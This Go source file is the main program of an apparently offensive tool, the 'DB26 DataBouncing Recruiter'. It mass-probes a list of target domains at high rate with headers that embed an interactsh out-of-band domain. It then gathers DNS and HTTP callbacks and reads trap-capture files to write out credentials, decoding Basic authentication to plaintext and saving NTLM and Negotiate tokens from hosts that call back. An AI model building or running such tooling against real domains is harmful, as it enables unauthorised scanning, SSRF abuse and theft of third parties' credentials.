package main

import (
	"bufio"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"db26/internal/auth"
	"db26/internal/config"
	"db26/internal/headers"
	"db26/internal/logparser"
	"db26/internal/metrics"
	"db26/internal/output"
	"db26/internal/preflight"
	"db26/internal/probe"
	"db26/internal/runconfig"
	"db26/internal/worker"

	interactsh "github.com/projectdiscovery/interactsh/pkg/client"
)

const defaultLogPath = "/var/log/interactsh/interactsh.log"

func main() {
	fmt.Println()
	fmt.Println("  ██████╗ ██████╗ ██████╗  ██████╗")
	fmt.Println("  ██╔══██╗██╔══██╗╚════██╗██╔════╝")
	fmt.Println("  ██║  ██║██████╔╝ █████╔╝███████╗")
	fmt.Println("  ██║  ██║██╔══██╗██╔═══╝ ██╔═══██╗")
	fmt.Println("  ██████╔╝██████╔╝███████╗╚██████╔╝")
	fmt.Println("  ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝")
	fmt.Println("  DataBouncing Recruiter")
	fmt.Println()

	// Load persistent config and set as env defaults before flag parsing
	rcfg, _ := runconfig.Load("")
	if rcfg.InteractshServer != "" && os.Getenv("DB26_OOB_SERVER") == "" {
		os.Setenv("DB26_OOB_SERVER", rcfg.InteractshServer)
	}
	if rcfg.InteractshToken != "" && os.Getenv("DB26_OOB_TOKEN") == "" {
		os.Setenv("DB26_OOB_TOKEN", rcfg.InteractshToken)
	}

	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "  Error: %s\n", err)
		fmt.Fprintf(os.Stderr, "\n  Usage:\n")
		fmt.Fprintf(os.Stderr, "    recruiter -d domains.txt -s https://oob.yourdomain.com -t <token> [options]\n\n")
		fmt.Fprintf(os.Stderr, "  Required:\n")
		fmt.Fprintf(os.Stderr, "    -d, --domains       Path to target domains file\n")
		fmt.Fprintf(os.Stderr, "    -s, --server        Interactsh server URL\n\n")
		fmt.Fprintf(os.Stderr, "  Auth:\n")
		fmt.Fprintf(os.Stderr, "    -t, --token         Interactsh server auth token\n")
		fmt.Fprintf(os.Stderr, "    --oob-domain        Use external OOB domain (skip registration)\n\n")
		fmt.Fprintf(os.Stderr, "  Performance:\n")
		fmt.Fprintf(os.Stderr, "    -w, --workers       Concurrent workers (default: 500)\n")
		fmt.Fprintf(os.Stderr, "    --rps               Max requests/sec (default: 1000)\n")
		fmt.Fprintf(os.Stderr, "    --timeout           Request timeout in seconds (default: 2)\n")
		fmt.Fprintf(os.Stderr, "    --https             Also probe HTTPS endpoints (default: true)\n\n")
		fmt.Fprintf(os.Stderr, "  Output:\n")
		fmt.Fprintf(os.Stderr, "    --run-dir           Output directory for reports (auto-created)\n")
		fmt.Fprintf(os.Stderr, "    -o, --output        Legacy output file (default: targets.txt)\n")
		fmt.Fprintf(os.Stderr, "    --grace             Seconds to wait for late callbacks (default: 60)\n\n")
		fmt.Fprintf(os.Stderr, "  Debug:\n")
		fmt.Fprintf(os.Stderr, "    --verify-headers    Print headers for 3 domains and exit\n")
		fmt.Fprintf(os.Stderr, "    -v, --verbose       Verbose output\n\n")
		fmt.Fprintf(os.Stderr, "  Reports (generated in --run-dir):\n")
		fmt.Fprintf(os.Stderr, "    summary.json                    Run metadata\n")
		fmt.Fprintf(os.Stderr, "    databouncing_candidates.jsonl   DNS callback domains\n")
		fmt.Fprintf(os.Stderr, "    tainted_fetches.jsonl           SSRF/RFI HTTP requests\n")
		fmt.Fprintf(os.Stderr, "    credential_captures.jsonl       Auth credential captures\n\n")
		fmt.Fprintf(os.Stderr, "  Environment:\n")
		fmt.Fprintf(os.Stderr, "    DB26_OOB_SERVER     Interactsh server URL\n")
		fmt.Fprintf(os.Stderr, "    DB26_OOB_TOKEN      Interactsh auth token\n")
		fmt.Fprintf(os.Stderr, "    INTERACTSH_LOG      Path to interactsh server log\n")
		fmt.Fprintf(os.Stderr, "    TRAP_CAPTURES       Path to auth trap captures JSON\n")
		fmt.Fprintf(os.Stderr, "    VPS_IP              VPS IP to filter from trap results\n")
		os.Exit(1)
	}

	if cfg.VerifyHeaders {
		verifyHeaders(cfg)
		return
	}

	// Apply remaining config defaults
	if cfg.RunDir == "" && rcfg.RunsDir != "" {
		cfg.RunDir = rcfg.RunsDir
	}

	// Show access info
	fmt.Printf("  Dashboard:  ssh -L 8888:127.0.0.1:8888 root@%s\n", rcfg.VPSAddress)
	fmt.Printf("              then http://localhost:8888 (db26/databouncing)\n")
	fmt.Println()

	// Pre-flight checks with dependency verification
	results, ok := preflight.RunWithDeps(
		cfg.DomainsFile, cfg.OOBServer, cfg.OOBToken, cfg.RunDir,
		rcfg.BinPaths,
	)
	preflight.Print(results)
	if !ok {
		fmt.Fprintf(os.Stderr, "  Pre-flight failed. Fix the issues above and retry.\n")
		fmt.Fprintf(os.Stderr, "  Config: %s\n\n", "~/.db26/config.json")
		os.Exit(1)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\n[*] Shutting down gracefully...")
		cancel()
	}()

	m := metrics.New()

	writer, err := output.NewWriter(cfg.OutputFile, cfg.JSONLog, cfg.AuthFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "output error: %s\n", err)
		os.Exit(1)
	}
	defer writer.Close()

	// --- Get fresh OOB domain ---
	var oobDomain string
	var corrID string

	if cfg.OOBDomain != "" {
		oobDomain = cfg.OOBDomain
		// Extract correlation ID from the domain (everything before .oob.)
		parts := strings.SplitN(oobDomain, ".", 2)
		corrID = parts[0]
		fmt.Printf("[*] Using provided OOB domain: %s\n", oobDomain)
	} else {
		fmt.Printf("[*] Registering with interactsh: %s\n", cfg.OOBServer)
		opts := &interactsh.Options{
			ServerURL: cfg.OOBServer,
			Token:     cfg.OOBToken,
		}
		ishClient, err := interactsh.New(opts)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Failed to register: %s\n", err)
			os.Exit(1)
		}
		oobDomain = ishClient.URL()
		// Extract correlation ID
		parts := strings.SplitN(oobDomain, ".", 2)
		corrID = parts[0]
		// Don't close — keep registration alive
		defer ishClient.Close()
		fmt.Printf("[*] OOB domain: %s\n", oobDomain)
	}

	fmt.Printf("[*] Correlation ID: %s\n", corrID)

	// --- Start log parser (reads interactsh server log directly) ---
	logPath := defaultLogPath
	if envLog := os.Getenv("INTERACTSH_LOG"); envLog != "" {
		logPath = envLog
	}

	parser := logparser.NewParser(corrID, m, func(c logparser.Candidate) {
		// New candidate found — write to output
		prefix := c.Prefix
		if prefix == "" {
			prefix = "unknown"
		}
		fmt.Printf("[+] CANDIDATE: %s [%s] via %s from %s\n",
			c.Domain, prefix, c.Protocol, c.RemoteAddress)
	})

	done := make(chan struct{})
	go func() {
		if err := parser.TailLog(logPath, done); err != nil {
			fmt.Fprintf(os.Stderr, "[WARN] log parser: %s\n", err)
		}
	}()
	fmt.Printf("[*] Tailing server log: %s\n", logPath)

	// --- Channels ---
	jobCh := make(chan worker.ProbeJob, 10000)
	resultCh := make(chan worker.ResultPair, 5000)

	probeClient := probe.NewClient(cfg.TimeoutSecs)
	pool := worker.NewPool(cfg.Workers, cfg.RPS, probeClient, m)

	// Auth detection pipeline
	go func() {
		for pair := range resultCh {
			processResult(pair.HTTP, cfg, writer, m)
			if pair.HTTPS != nil {
				processResult(*pair.HTTPS, cfg, writer, m)
			}
		}
	}()

	go progressReporter(ctx, m, cfg.Verbose)

	// Feed domains
	go func() {
		defer close(jobCh)
		if err := feedDomains(ctx, cfg.DomainsFile, oobDomain, jobCh); err != nil {
			fmt.Fprintf(os.Stderr, "[ERROR] reading domains: %s\n", err)
		}
	}()

	// Run probes
	fmt.Printf("[*] Starting %d workers at %d RPS (timeout: %ds, HTTPS: %v)...\n",
		cfg.Workers, cfg.RPS, cfg.TimeoutSecs, cfg.ProbeHTTPS)
	pool.Run(ctx, jobCh, resultCh, cfg.ProbeHTTPS)
	close(resultCh)

	// Grace period
	fmt.Printf("[*] Probing complete. Waiting %ds for late callbacks...\n", cfg.GracePeriodSec)
	select {
	case <-time.After(time.Duration(cfg.GracePeriodSec) * time.Second):
	case <-ctx.Done():
	}

	close(done)

	// Final summary
	snap := m.Snap()
	fmt.Println("\n========================================")
	fmt.Println(" DB26 Recruiter — Complete")
	fmt.Println("========================================")
	fmt.Printf(" Duration:      %s\n", snap.Elapsed.Truncate(time.Second))
	fmt.Printf(" Probes:        %d sent (%.0f/s)\n", snap.ProbesSent, snap.RPS)
	fmt.Printf(" HTTP OK:       %d\n", snap.ProbesHTTPOK)
	fmt.Printf(" HTTPS OK:      %d\n", snap.ProbesHTTPSOK)
	fmt.Printf(" Errors:        %d\n", snap.ProbesErrors)
	fmt.Printf(" DNS callbacks: %d\n", snap.CallbackDNS)
	fmt.Printf(" HTTP cb:       %d\n", snap.CallbackHTTP)
	fmt.Printf(" HTTPS cb:      %d\n", snap.CallbackHTTPS)
	fmt.Printf(" Candidates:    %d\n", parser.CandidateCount())
	fmt.Printf(" Auth:          %d (NTLM:%d Basic:%d Negotiate:%d)\n",
		snap.AuthTotal, snap.AuthNTLM, snap.AuthBasic, snap.AuthNegotiate)

	// --- Generate reports ---
	reportDir := cfg.RunDir
	if reportDir == "" {
		reportDir = "."
	}
	os.MkdirAll(reportDir, 0755)

	fmt.Printf("\n[*] Generating reports in %s...\n", reportDir)
	generateReports(logPath, reportDir, corrID, snap, parser)
	fmt.Println("========================================")
}

func feedDomains(ctx context.Context, path, oobDomain string, jobs chan<- worker.ProbeJob) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		domain := strings.TrimSpace(scanner.Text())
		if domain == "" || strings.HasPrefix(domain, "#") {
			continue
		}

		payloads := headers.Build(domain, oobDomain)
		jobs <- worker.ProbeJob{
			Domain:   domain,
			Payloads: payloads,
		}
	}

	return scanner.Err()
}

func processResult(r probe.Result, cfg config.Config, writer *output.Writer, m *metrics.Counters) {
	if !r.HasAuthChallenge() {
		return
	}

	wwwAuth := r.Headers["Www-Authenticate"]
	detections := auth.Detect(r.Domain, r.Protocol, wwwAuth, r.Timestamp)

	for _, det := range detections {
		switch det.Scheme {
		case "NTLM":
			m.IncAuthNTLM()
		case "Basic":
			m.IncAuthBasic()
		case "Negotiate":
			m.IncAuthNegotiate()
		}

		if err := writer.WriteAuthDetection(det); err != nil {
			fmt.Fprintf(os.Stderr, "[WARN] write auth detection: %s\n", err)
		}

		fmt.Printf("[AUTH] %s on %s://%s (realm: %s)\n",
			det.Scheme, det.Protocol, det.Domain, det.Realm)
	}
}

func progressReporter(ctx context.Context, m *metrics.Counters, verbose bool) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			snap := m.Snap()
			fmt.Printf("[*] %s | Sent: %d (%.0f/s) | DNS: %d | HTTP: %d | HTTPS: %d | Candidates: %d | Auth: %d\n",
				snap.Elapsed.Truncate(time.Second),
				snap.ProbesSent, snap.RPS,
				snap.CallbackDNS, snap.CallbackHTTP, snap.CallbackHTTPS,
				snap.ViableDomains, snap.AuthTotal)
		}
	}
}

// --- Report generation ---

type CandidateRecord struct {
	Domain    string         `json:"domain"`
	Callbacks int            `json:"callbacks"`
	Headers   map[string]int `json:"headers"`
	Protocols map[string]int `json:"protocols"`
	SourceIPs []string       `json:"source_ips"`
	FirstSeen string         `json:"first_seen"`
}

type RunSummary struct {
	CorrelationID string `json:"correlation_id"`
	Duration      string `json:"duration"`
	ProbesSent    int64  `json:"probes_sent"`
	RPS           float64 `json:"rps"`
	HTTPOK        int64  `json:"http_ok"`
	HTTPSOK       int64  `json:"https_ok"`
	Errors        int64  `json:"errors"`
	DNSCallbacks  int64  `json:"dns_callbacks"`
	HTTPCallbacks int64  `json:"http_callbacks"`
	HTTPSCallbacks int64 `json:"https_callbacks"`
	Candidates    int    `json:"candidates"`
	AuthTotal     int64  `json:"auth_total"`
	AuthNTLM      int64  `json:"auth_ntlm"`
	AuthBasic     int64  `json:"auth_basic"`
	AuthNegotiate int64  `json:"auth_negotiate"`
}

func generateReports(logPath, reportDir, corrID string, snap metrics.Snapshot, parser *logparser.Parser) {
	// 1. Write run summary
	summary := RunSummary{
		CorrelationID:  corrID,
		Duration:       snap.Elapsed.Truncate(time.Second).String(),
		ProbesSent:     snap.ProbesSent,
		RPS:            snap.RPS,
		HTTPOK:         snap.ProbesHTTPOK,
		HTTPSOK:        snap.ProbesHTTPSOK,
		Errors:         snap.ProbesErrors,
		DNSCallbacks:   snap.CallbackDNS,
		HTTPCallbacks:  snap.CallbackHTTP,
		HTTPSCallbacks: snap.CallbackHTTPS,
		Candidates:     parser.CandidateCount(),
		AuthTotal:      snap.AuthTotal,
		AuthNTLM:       snap.AuthNTLM,
		AuthBasic:      snap.AuthBasic,
		AuthNegotiate:  snap.AuthNegotiate,
	}
	writeJSON(filepath.Join(reportDir, "summary.json"), summary)

	// 2. Write databouncing_candidates.jsonl from log parser results
	candidatePath := filepath.Join(reportDir, "databouncing_candidates.jsonl")
	results := parser.Results()
	if cf, err := os.Create(candidatePath); err == nil {
		enc := json.NewEncoder(cf)
		count := 0
		for domain, prefixes := range results {
			rec := CandidateRecord{
				Domain:    domain,
				Callbacks: len(prefixes),
				Headers:   make(map[string]int),
			}
			for _, p := range prefixes {
				rec.Headers[p]++
			}
			enc.Encode(rec)
			count++
		}
		cf.Close()
		fmt.Printf("    databouncing_candidates.jsonl  %d domains\n", count)
	}

	// 3. Read trap captures and generate tainted_fetches.jsonl + credential_captures.jsonl
	trapPath := os.Getenv("TRAP_CAPTURES")
	if trapPath == "" {
		// Try common locations
		candidates := []string{
			filepath.Join(reportDir, "trap_captures.json"),
			"/root/ntlm_captures_subs.json",
			"/root/basic_captures.json",
		}
		for _, p := range candidates {
			if _, err := os.Stat(p); err == nil {
				trapPath = p
				break
			}
		}
	}

	fetchCount, credCount := 0, 0
	if trapPath != "" {
		fetchCount, credCount = generateFetchReports(trapPath, reportDir)
	} else {
		fmt.Println("    [WARN] No trap captures file found — skipping tainted_fetches/credentials")
		// Create empty files
		os.Create(filepath.Join(reportDir, "tainted_fetches.jsonl"))
		os.Create(filepath.Join(reportDir, "credential_captures.jsonl"))
	}

	fmt.Printf("    tainted_fetches.jsonl          %d requests\n", fetchCount)
	fmt.Printf("    credential_captures.jsonl      %d captures\n", credCount)
}

func generateFetchReports(trapPath, reportDir string) (fetchCount, credCount int) {
	tf, err := os.Open(trapPath)
	if err != nil {
		return 0, 0
	}
	defer tf.Close()

	fetchFile, _ := os.Create(filepath.Join(reportDir, "tainted_fetches.jsonl"))
	defer fetchFile.Close()
	credFile, _ := os.Create(filepath.Join(reportDir, "credential_captures.jsonl"))
	defer credFile.Close()

	fetchEnc := json.NewEncoder(fetchFile)
	credEnc := json.NewEncoder(credFile)

	vpsIP := "<YOUR_VPS_IP>"
	if v := os.Getenv("VPS_IP"); v != "" {
		vpsIP = v
	}

	scanner := bufio.NewScanner(tf)
	for scanner.Scan() {
		var cap struct {
			RemoteAddr    string              `json:"remote_addr"`
			Host          string              `json:"host"`
			Method        string              `json:"method"`
			URI           string              `json:"uri"`
			TLS           bool                `json:"tls"`
			Authorization string              `json:"authorization"`
			UserAgent     string              `json:"user_agent"`
			Timestamp     string              `json:"timestamp"`
			AllHeaders    map[string][]string `json:"all_headers"`
		}
		if err := json.Unmarshal(scanner.Bytes(), &cap); err != nil {
			continue
		}

		if strings.Contains(cap.RemoteAddr, vpsIP) {
			continue
		}

		proto := "http"
		if cap.TLS {
			proto = "https"
		}

		rec := map[string]interface{}{
			"source_ip": cap.RemoteAddr,
			"host":      cap.Host,
			"protocol":  proto,
			"method":    cap.Method,
			"uri":       cap.URI,
			"user_agent": cap.UserAgent,
			"class":     classifyURI(cap.URI),
			"timestamp": cap.Timestamp,
			"has_auth":  cap.Authorization != "",
		}

		if cap.Authorization != "" {
			authType, creds := decodeAuth(cap.Authorization)
			rec["auth_type"] = authType
			rec["credentials"] = creds
			rec["raw_auth"] = cap.Authorization

			credEnc.Encode(rec)
			credCount++
		}

		fetchEnc.Encode(rec)
		fetchCount++
	}

	return fetchCount, credCount
}

func classifyURI(uri string) string {
	u := strings.ToLower(uri)
	switch {
	case u == "/":
		return "root_fetch"
	case strings.Contains(u, ".git"):
		return "git_exposure"
	case strings.Contains(u, "_ignition"):
		return "laravel_rce"
	case strings.Contains(u, ".env"):
		return "env_exposure"
	case strings.Contains(u, "wp-"):
		return "wordpress_probe"
	case strings.Contains(u, "/api"):
		return "api_fetch"
	case strings.Contains(u, "/admin"):
		return "admin_probe"
	case strings.Contains(u, "/login"), strings.Contains(u, "/auth"):
		return "auth_probe"
	case strings.HasSuffix(u, ".xml"):
		return "xml_fetch"
	case strings.HasSuffix(u, ".json"):
		return "config_fetch"
	case strings.Contains(u, "/wap"):
		return "wap_profile"
	case strings.Contains(u, "robots.txt"):
		return "crawl_probe"
	case strings.Contains(u, "favicon"):
		return "asset_fetch"
	case strings.Contains(u, "/.well-known"):
		return "discovery"
	case strings.HasSuffix(u, ".php"):
		return "php_include"
	case strings.HasSuffix(u, ".asp"), strings.HasSuffix(u, ".aspx"):
		return "asp_include"
	default:
		return "other"
	}
}

func decodeAuth(authHeader string) (string, string) {
	switch {
	case strings.HasPrefix(authHeader, "NTLM "):
		return "ntlm", authHeader[5:]
	case strings.HasPrefix(authHeader, "Negotiate "):
		return "negotiate", authHeader[10:]
	case strings.HasPrefix(authHeader, "Basic "):
		decoded, err := base64.StdEncoding.DecodeString(authHeader[6:])
		if err != nil {
			return "basic", "(decode_failed)"
		}
		return "basic", string(decoded)
	case strings.HasPrefix(authHeader, "Digest "):
		return "digest", authHeader[7:]
	default:
		return "unknown", authHeader
	}
}

func writeJSON(path string, v interface{}) {
	f, err := os.Create(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[WARN] create %s: %s\n", path, err)
		return
	}
	defer f.Close()
	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	enc.Encode(v)
}

func verifyHeaders(cfg config.Config) {
	var oobDomain string
	if cfg.OOBServer != "" {
		opts := &interactsh.Options{
			ServerURL: cfg.OOBServer,
			Token:     cfg.OOBToken,
		}
		ishClient, err := interactsh.New(opts)
		if err != nil {
			fmt.Fprintf(os.Stderr, "error connecting to interactsh: %s\n", err)
			os.Exit(1)
		}
		oobDomain = ishClient.URL()
		defer ishClient.Close()
	} else {
		fmt.Fprintf(os.Stderr, "error: --server is required for verify-headers\n")
		os.Exit(1)
	}

	f, err := os.Open(cfg.DomainsFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %s\n", err)
		os.Exit(1)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	count := 0

	fmt.Println("========================================")
	fmt.Println(" Header Verification Mode")
	fmt.Printf(" OOB domain: %s\n", oobDomain)
	fmt.Println("========================================")

	for scanner.Scan() && count < 3 {
		domain := strings.TrimSpace(scanner.Text())
		if domain == "" || strings.HasPrefix(domain, "#") {
			continue
		}

		payloads := headers.Build(domain, oobDomain)
		fmt.Printf("\n--- %s (sanitized: %s) ---\n", domain, headers.SanitizeDomain(domain))
		fmt.Printf("    GET http://%s/\n\n", domain)
		for _, p := range payloads {
			fmt.Printf("    > %s: %s\n", p.Name, p.Value)
		}
		fmt.Printf("\n    Headers: %d\n", len(payloads))
		count++
	}
	fmt.Println("\n========================================")
}
